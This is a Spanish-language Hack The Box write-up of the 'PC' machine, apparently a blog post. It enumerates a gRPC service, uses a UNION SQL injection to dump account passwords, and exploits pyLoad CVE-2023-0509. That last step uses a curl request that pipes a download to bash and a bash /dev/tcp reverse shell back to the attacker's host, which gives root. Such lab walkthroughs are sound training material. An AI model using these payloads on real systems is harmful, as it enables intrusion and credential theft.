@@ -1,0 +1,274 @@
+---
+layout: post
+title: PC
+date: 2023-10-07
+description:
+img:
+fig-caption:
+tags: [eJPT, OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/PC-htb/PC.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración por GRPC
+
+* Inyección SQL
+
+* CVE-2023-0509 - RCE en PyLoads (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.214 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 19:20 GMT
+Nmap scan report for 10.10.11.214
+Host is up (0.13s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+50051/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 27.02 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,50051 10.10.11.214 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 19:22 GMT
+Nmap scan report for 10.10.11.214
+Host is up (0.089s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
+|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
+|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
+50051/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port50051-TCP:V=7.93%I=7%D=5/24%Time=646E63EA%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
+SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
+SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
+SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
+SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
+SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
+SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
+SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
+SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
+SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
+SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
+SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
+SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
+SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
+SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
+SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
+SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
+SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
+SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
+SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
+SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
+SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
+SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
+SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
+SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
+SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
+SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
+SF:0\0\0\0\0\?\0\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.89 seconds
+```
+
+## Puerto 50051 (???)
+
+Me conecto por ```netcat``` a este servicio
+
+```null
+nc 10.10.11.214 50051
+???
+```
+
+Devuelve tres interrogantes. Como no conozco en que consiste, lo busco por internet y aparace en la primera entrada de ```DuckDuckGo```
+
+<img src="/writeups/assets/img/PC-htb/1.png" alt="">
+
+En este [artículo](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) explican como auditar ```GRPC```. Instalo este [repositorio](https://github.com/fullstorydev/grpcurl/releases/tag/v1.8.7) para poder tramitar peticiones por este protocolo
+
+Comienzo a enumerar este servicio
+
+```null
+grpcurl -plaintext 10.10.11.214:50051 list
+SimpleApp
+grpc.reflection.v1alpha.ServerReflection
+```
+
+Parece estar expuesta una aplicación
+
+```null
+grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
+SimpleApp.LoginUser
+SimpleApp.RegisterUser
+SimpleApp.getInfo
+```
+
+Tramito una petición a cada una
+
+```null
+grpcurl -plaintext 10.10.11.214:50051 SimpleApp.LoginUser
+{
+  "message": "Login unsuccessful"
+}
+```
+
+```null
+grpcurl -plaintext 10.10.11.214:50051 SimpleApp.RegisterUser
+{
+  "message": "username or password must be greater than 4"
+}
+```
+
+```null
+grpcurl -plaintext 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "Authorization Error.Missing 'token' header"
+}
+```
+
+Es posible habilitar la interfaz web
+
+```null
+grpcui -plaintext 10.10.11.214:50051
+gRPC Web UI available at http://127.0.0.1:45573/
+[12715:12745:0524/194446.744113:ERROR:bus.cc(399)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
+[12715:12745:0524/194446.744349:ERROR:bus.cc(399)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
+Opening in existing browser session.
+```
+
+<img src="/writeups/assets/img/PC-htb/2.png" alt="">
+
+Las credenciales por defecto son ```admin:admin```
+
+<img src="/writeups/assets/img/PC-htb/3.png" alt="">
+
+Obtengo el identificador junto a un token
+
+<img src="/writeups/assets/img/PC-htb/4.png" alt="">
+
+El parámetro ```id``` es vulnerable a inyección SQL
+
+```null
+"id":"629 union SELECT GROUP_CONCAT(password) from accounts"
+```
+
+En la respuesta se puede ver la contraseña
+
+```null
+  "error": null,
+  "responses": [
+    {
+      "message": {
+        "message": "admin,HereIsYourPassWord1431,haris"
+      },
+      "isError": false
+    }
+  ],
+```
+
+Lo mismo para el usuario
+
+```null
+"id":"629 union SELECT GROUP_CONCAT(username) from accounts"
+```
+
+```null
+  "error": null,
+  "responses": [
+    {
+      "message": {
+        "message": "admin,haris,hell,sau"
+      },
+      "isError": false
+    }
+  ],
+```
+
+Me conecto por SSH y puedo ver la primera flag
+
+```null
+u@10.10.11.214's password: 
+Last login: Wed May 24 19:46:43 2023 from 10.10.14.147
+sau@pc:~$ cat user.txt 
+c24ca9077b5e716baef6bab2b02539c0
+```
+
+# Escalada
+
+En el directorio de Descargas de este usuario se encuentra ```pyloads```. El puerto 8000 está abierto internamente
+
+```nulll
+sau@pc:~/Downloads$ ss -nltp
+State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                  Process                  
+LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*                                              
+LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*                                              
+LISTEN                   0                        5                                              127.0.0.1:8000                                           0.0.0.0:*                                              
+LISTEN                   0                        128                                              0.0.0.0:9666                                           0.0.0.0:*                                              
+LISTEN                   0                        128                                                 [::]:22                                                [::]:*                                              
+LISTEN                   0                        4096                                                   *:50051                                                *:*                         
+```
+
+Aplico Local Port Forwarding para poder conectarme desde mi equipo
+
+```null
+ssh sau@10.10.11.214 -L 8080:127.0.0.1:8000
+```
+
+<img src="/writeups/assets/img/PC-htb/5.png" alt="">
+
+Esta versión tiene un CVE asocidado y es posible ejecutar comandos sin estar autenticado. Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell
+
+```null
+cat index.html
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.40/443 0>&1'
+```
+
+Envío la petición
+
+```null
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"curl%2010.10.16.40%20%7C%20bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:8000/flash/addcrypted2'
+```
+
+Gano acceso al sistema en una sesión de ```netcat``` y veo la segunda flag
+
+```null
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.10.11.214] 59582
+bash: cannot set terminal process group (1042): Inappropriate ioctl for device
+bash: no job control in this shell
+root@pc:~/.pyload/data# cat /root/root.txt
+cat /root/root.txt
+5adebef9c1e45b21f3f4784a97ad8096
+root@pc:~/.pyload/data#
+```
